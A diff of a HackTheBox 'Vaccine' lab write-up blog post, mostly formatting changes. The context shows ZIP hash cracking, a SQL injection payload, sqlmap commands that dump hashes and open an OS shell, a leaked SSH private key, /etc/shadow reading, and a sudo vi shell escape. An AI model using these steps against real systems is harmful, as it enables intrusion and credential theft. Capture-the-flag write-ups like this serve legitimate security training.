@@ -1,35 +1,34 @@
-## HTB Starting Point: Vaccine
+---
+title: "HTB Starting Point: Vaccine"
+seoTitle: "HackTheBox Starting Point: Vaccine write-up"
+seoDescription: "Complete write-up for Vaccine hacking box from HackTheBox with additional comments and educational materials."
+datePublished: Mon Jul 12 2021 04:27:02 GMT+0000 (Coordinated Universal Time)
+cuid: ckr04j9u70pgd5bs11ess9nmj
+slug: htb-starting-point-vaccine
+cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1625919559495/C_t1HYbpY.png
+ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1626063959897/8wYyfpYzi.png
+tags: learning, hacking, cybersecurity-1
 
-`Vaccine` is a 3rd box from Starting Point path on Hack The Box. This path is composed of 9 boxes in a way that later boxes use information (like credentials) gathered from the previous ones. See the other write-ups [here](https://blog.cyberethical.me/series/htb-starting-point).
+---
+
+`Vaccine` is a 3rd box from Starting Point path on [HackTheBox Starting Point - Tier 2](https://affiliate.hackthebox.com/cybeth-htbstart). This path is composed of 9 boxes in a way that later boxes use information (like credentials) gathered from the previous ones. See the other write-ups [here](https://blog.cyberethical.me/series/htb-starting-point).
 
 This box features working with MD5 hashes and escaping user context to root by exploiting sudoer misconfiguration.
 
 # Basic Information
 
-| #     |   |
-|:--    |:--|
-| Type    |Starting Point
-|Name    | **	Hack The Box / Vaccine**
-|Pwned| 2021/06/01
-|URLs    | https://app.hackthebox.eu/machines/289
-|Author  | **Asentinn** / OkabeRintaro
-|       | [https://ctftime.org/team/152207](https://ctftime.org/team/152207)
+| # |  |
+| --- | --- |
+| Type | Starting Point |
+| Name | \*\* Hack The Box / Vaccine\*\* |
+| Pwned | 2021/06/01 |
+| URLs | [Starting Point - Tier 2](https://affiliate.hackthebox.com/cybeth-htbstart) |
+| Author | **Asentinn** / OkabeRintaro |
+|  | [https://ctftime.org/team/152207](https://ctftime.org/team/152207) |
 
-%%[patreon-btn]
+%%[patreon-btn] 
 
-***
-# Contents
-1. [Basic Information](#basic-information)
-2. [Target of  Exploration](#target-of-exploration)
-3. [Recon](#recon)
-4. [User shell](#user-shell)
-5. [Privilege Escalation](#privilege-escalation)
-6. [Post exploits](#post-exploits)
-7. [Hardening ideas](#hardening-ideas)
-8. [Additional readings](#additional-readings)
-***
-
-# Target of  Exploration
+# Target of Exploration
 
 Setting shell variable `IP=10.10.10.28`
 
@@ -79,7 +78,6 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 26.33 seconds
-
 ```
 
 [Back to top](#contents) ⤴
@@ -88,10 +86,9 @@ Nmap done: 1 IP address (1 host up) scanned in 26.33 seconds
 
 Using credentials from `Oopsie` [box](/htb-starting-point-oopsie) (`ftpuser/mc@F1l3ZilL4`):
 
-![2277883806501.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625864014415/XFd_n9b6r.png)
+![2277883806501.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625864014415/XFd_n9b6r.png align="left")
 
 File is encrypted, so let's crack the password using `john`, but first prepare the input file with `zip2hash`.
-
 
 > Read more about cracking ZIP passwords using `john` and `fcrackzip` in [Additional readings](#additional-readings).
 
@@ -99,14 +96,15 @@ File is encrypted, so let's crack the password using `john`, but first prepare t
 $ zip2john backup.zip > zip.hash
 ```
 
-![820195595593.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879527115/PEOhnJpfE.png)
+![820195595593.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879527115/PEOhnJpfE.png align="left")
 
-![4483618921344.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879534792/MH4_q9iIl.png)
+![4483618921344.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879534792/MH4_q9iIl.png align="left")
 
 ```txt
 $ john --wordlist=/usr/wl/rockyou.txt zip.hash
 ```
-![5799683869748.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879551999/Y7D4RP-fQ.png)
+
+![5799683869748.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879551999/Y7D4RP-fQ.png align="left")
 
 ```sh
 $ unzip backup.zip
@@ -130,9 +128,10 @@ session_start();
     }
   }
 ```
+
 This time, [CrackStation](https://crackstation.net/) finds the plain text right away.
 
-![5258309278801.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879571068/gNZCDsZvm.png)
+![5258309278801.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879571068/gNZCDsZvm.png align="left")
 
 Save for later and let's come back to the recon - website.
 
@@ -142,11 +141,11 @@ Save for later and let's come back to the recon - website.
 
 ## Website (:80)
 
-![1736916102868.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880107903/E36OLXFMQ.png)
+![1736916102868.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880107903/E36OLXFMQ.png align="left")
 
 By using the `admin/qwerty789` credentials, I can access the dashboard.
 
-![4725115556390.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880099771/IypPaW8IP.png)
+![4725115556390.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880099771/IypPaW8IP.png align="left")
 
 By intercepting the requests in `burpsuite` and making prepared requests in the repeater, I can recognize the select used to get the dashboard is using 5 columns.
 
@@ -156,6 +155,7 @@ GET /dashboard.php?search='%20ORDER%20BY%206;-- HTTP/1.1
 ERROR:  ORDER BY position 6 is not in select list
 LINE 1: Select * from cars where name ilike '%' ORDER BY 6;--%'
 ```
+
 > More details on how `order by` helps in `UNION` injection at [Additional readings](#additional-readings).
 
 So, we can exploit that by using the `UNION` injection. For example, here is the schema names dump:
@@ -219,7 +219,6 @@ available databases [3]:
 [*] information_schema
 [*] pg_catalog
 [*] public
-
 ```
 
 Here I'm dumping the `pg_config` table in `pg_catalog` schema. `--batch` is used to accept any prompts `sqlmap` is making.
@@ -258,13 +257,14 @@ Let's check what users we have access and which privileges that user has.
 ```txt
 $ sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --users
 ```
-![1221481927212.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879601334/Iv04MRhgU.png)
+
+![1221481927212.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879601334/Iv04MRhgU.png align="left")
 
 ```txt
 $ sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch -U postgres --roles
 ```
 
-![1282818797398.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625951019024/WZxWiadal.png)
+![1282818797398.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625951019024/WZxWiadal.png align="left")
 
 Ok, let's dump the password hash for `postgres` and exploit that `super` permission.
 
@@ -272,7 +272,7 @@ Ok, let's dump the password hash for `postgres` and exploit that `super` permiss
 sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --password
 ```
 
-![2708755891538.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879626411/IAyJBha1o.png)
+![2708755891538.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879626411/IAyJBha1o.png align="left")
 
 [Back to top](#contents) ⤴
 
@@ -284,13 +284,13 @@ sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvu
 sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --os-shell
 ```
 
-![3162090529455.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880011508/zp2lOteVH.png)
+![3162090529455.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880011508/zp2lOteVH.png align="left")
 
 We've got the `postgres` user shell. And by using `id` we can see that user is in `ssl-cert` group. That means we should maybe find an SSH keys?
 
-![4501945095047.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880000639/vPaLErb5l.png)
+![4501945095047.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880000639/vPaLErb5l.png align="left")
 
-![2218217336621.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879990698/Lx7SgGx71.png)
+![2218217336621.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879990698/Lx7SgGx71.png align="left")
 
 Bingo.
 
@@ -304,7 +304,6 @@ NhAAAAAwEAAQAAAYEA0a5cdsLhNwBeZvZB5tYxL80+03AaJwcnAyEzffSXcluql1xNztZr
 7Dj1cDAVWXOqAJO9Ks3PLh6P7eP36lg2w/4/CHkvTmdJ9yr7nLclP5QS/gWghlTl2SkoIq
 r1Y3QWupZhHES9swAAABBwb3N0Z3Jlc0B2YWNjaW5lAQ==
 -----END OPENSSH PRIVATE KEY-----
-
 ```
 
 I'm copying the key to a file on my local machine, `chmod 600` it and converting with `ssh-keygen -f vaccine.id_rsa -p` using no password I can connect to SSH.
@@ -330,7 +329,7 @@ postgres@vaccine:~$ cat /etc/passwd | grep -v nologin
 
 > `-v` to invert mach - lines that do not match `nologin`, you should also filter out `/bin/false` strings
 
-![1081383767677.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880029804/Tr5pXb6VZ.png)
+![1081383767677.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880029804/Tr5pXb6VZ.png align="left")
 
 Maybe it can come in handy later.
 
@@ -340,7 +339,7 @@ When you have the access to the server when PHP files are served, good practice 
 postgres@vaccine:~$ cat /var/www/html/dashboard.php
 ```
 
-![3006043138502.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880038827/JsU1s4aW9.png)
+![3006043138502.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880038827/JsU1s4aW9.png align="left")
 
 New credentials:
 
@@ -352,7 +351,7 @@ New credentials:
 
 > 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring on the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/cyberethicalme) which also gives you some bonus perks.
 
-![3899212738531.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880051716/nUGWx38aS.png)
+![3899212738531.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880051716/nUGWx38aS.png align="left")
 
 In `vi` you can run system commands using `:!` command... so let's exploit that.
 
@@ -364,9 +363,9 @@ And inside `vi` type `:! /bin/sh`
 
 Boom.
 
-![1791832992803.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880069325/DVADCDKFG.png)
+![1791832992803.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880069325/DVADCDKFG.png align="left")
 
-![1567896233080.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880061892/kyqzsUOoG.png)
+![1567896233080.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880061892/kyqzsUOoG.png align="left")
 
 [Back to top](#contents) ⤴
 
@@ -374,15 +373,15 @@ Boom.
 
 > Like what you see? Join the [Hashnode.com](/join) now. Things that are awesome:
 
->✔ Automatic GitHub Backup
+> ✔ Automatic GitHub Backup
 
->✔ Write in Markdown
+> ✔ Write in Markdown
 
->✔ Free domain mapping
+> ✔ Free domain mapping
 
->✔ CDN hosted images
+> ✔ CDN hosted images
 
->✔ Free in-built newsletter service
+> ✔ Free in-built newsletter service
 
 > By using my link you can help me unlock the ambasador role, which cost you nothing and gives me some additional features to support my content creation mojo.
 
@@ -391,7 +390,8 @@ Now that we have the root access, maybe we can crack something from `shadow` fil
 ```txt
 cat /etc/shadow | grep -vF :*: | grep -vF :!:
 ```
-![2267952157893.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880079349/aqvO6cSFp.png)
+
+![2267952157893.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880079349/aqvO6cSFp.png align="left")
 
 ```txt
 root:$6$mJFt2hPm87QQnTTe$iQR6I/fnw56HY7KABpVORJ4uabDHfWILJLAj0PTswex.epHHMhcRAoR08J3MrHPYu3SFd67DoUdaLSFYxwE4/1:18296:0:99999:7:::
@@ -431,15 +431,16 @@ Just don't.
 
 > 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek)
 
-> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)
+> 👉 Twitter: [@cyberethical\_me](https://twitter.com/cyberethical_me)
 
 > 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)
 
 * [How to crack zip password on Kali Linux](https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux)
-
+    
 * [SQL Injection - Exploiting Union Based @ HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based)
-
+    
 * [The Ultimate SQL Injection Cheat Sheet](https://www.hackingloops.com/sql-injection-cheat-sheet/)
+    
 
 #### Check other write-ups from the Starting Point path - links below the article, or navigate directly to the series [here](/series/htb-starting-point).
 
